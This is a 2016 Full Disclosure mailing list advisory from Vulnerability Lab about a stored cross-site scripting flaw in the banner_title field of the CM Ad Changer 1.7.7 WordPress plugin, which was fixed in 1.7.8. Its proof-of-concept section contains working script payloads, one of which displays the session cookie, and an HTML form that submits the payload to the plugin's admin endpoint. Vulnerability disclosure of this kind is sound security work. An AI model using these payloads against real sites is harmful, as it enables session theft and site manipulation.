
Date: Mon, 13 Jun 2016 16:44:23 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] CM Ad Changer 1.7.7 Wordpress Plugin - Cross Site Scripting
 Web Vulnerability

Document Title:
===============
CM Ad Changer 1.7.7 Wordpress Plugin - Cross Site Scripting Web Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1856


Release Date:
=============
2016-06-13


Vulnerability Laboratory ID (VL-ID):
====================================
1856


Common Vulnerability Scoring System:
====================================
3.5


Product & Service Introduction:
===============================
Are you running various marketing ad campaigns? Care to check the return of your investment? Are you really getting the message out there, 
and is it working? The CM Ad Changer plugin manages, tracks and provides reports on how well your advertising campaigns are running. Designed 
specifically for eCommerce, the CM Ad-Changer can be used for cross-website banner advertising promotions, managing discount sale events and 
improving your product banner ads. 

(Copy of the Homepage: https://ad-changer.cminds.com/ )


Abstract Advisory Information:
==============================
An indepedent vulnerability laboratory researcher discovered a stored cross site scripting web vulnerability in the official CM Ad Changer v1.7.7 Wordpress Plugin.


Vulnerability Disclosure Timeline:
==================================
2016-06-13: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
CreativeMinds
Product: CM Ad Changer - Wordpress Plugin (Web-Application) 1.7.7


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A stored cross site scripting web vulnerability has been discovered in the official CM Ad v1.7.7 Wordpress Plugins.
The web vulnerability allows remote attackers to inject own malicious script codes to the application-side of the service.

The cross site vulnerability is located in the `banner_title` parameter of the `cmac_campaigns` module POST method request.
Remote attackers are able to inject own malicious script codes to the cmac_campaigns add POST method request.

The security risk of the vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.5. 
Exploitation of the web vulnerability requires a low privileged web-application account with restricted access and low user interaction. 
Successful exploitation of the vulnerabilities results in persistent phishing, session hijacking, persistent external redirect to malicious 
sources and application-side manipulation of affected or connected module context.

Request Method(s):
				[+] POST

Vulnerable Module(s):
				[+] cmac_campaigns

Vulnerable Parameter(s):
				[+] banner_title


Proof of Concept (PoC):
=======================
The stored cross site vulnerability can be exploited by low privileged user accounts with low user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


Manual steps to reproduce the vulnerability ...
1. Go to CM Ad changers - Campaigns
2. Create a Campaign. Enter whatever you want in Campaign settings, in the next tab "Campaign Banners", select an Image in Campaign images and in Banner Title enter this payload
</script><script>confirm(/aaditya/)</script>
</script><script>confirm(document.cookie)</script>
3. Enter Save & the payload triggers to execute everytime you return to the module
4. Successful reproduce of the web vulnerability!


PoC: Exploitation
<html>
  <body>
    <h1> Click The button below. POC By Aaditya Purani:: CM AD Changer 1.7.7 </h1>   
    <form action="http://127.0.0.1/wordpress/wp-admin/admin.php?page=cmac_campaigns&action=edit&campaign_id={TARGET_ID}" method="POST">
      <input type="hidden" name="campaign_id" value="1" />
      <input type="hidden" name="title" value="Hacked by Aaditya" />
      <input type="hidden" name="comment" value="" />
      <input type="hidden" name="link" value="" />
      <input type="hidden" name="status" value="on" />
      <input type="hidden" name="banner_display_method" value="selected" />
      <input type="hidden" name="banner_filename[]" value="yourpicvalue.jpg" />
      <input type="hidden" name="banner_title[]" value="</script><script>confirm(/aaditya/)</script>" />
      <input type="hidden" name="banner_title_tag[]" value="" />
      <input type="hidden" name="banner_tag[]" value="" />
      <input type="hidden" name="banner_link[]" value="" />
      <input type="hidden" name="banner_weight[]" value="0" />
      <input type="hidden" name="selected_banner" value="yourpicvalue.jpg" />
      <input type="hidden" name="submit" value="Save" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Note: This will Trigger Stored XSS at banner_title Parameter.


Solution - Fix & Patch:
=======================
9th June - Public fix released & changelog updated 1.7.8


Security Risk:
==============
The security risk of the stored cross site scripting web vulnerability in the wordpress plugin is estimated as medium. (CVSS 3.5)


Credits & Authors:
==================
Aaditya Purani - (https://aadityapurani.com) [http://www.vulnerability-lab.com/show.php?user=Aaditya%20Purani]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or implied, 
including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage, 
including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised 
of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing 
limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 				- admin@...lution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically 
redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or 
its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific 
authors or managers. To record, list, modify, use or edit our material contact (admin@ or research@...nerability-lab.com) to get a ask permission.

				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™




-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/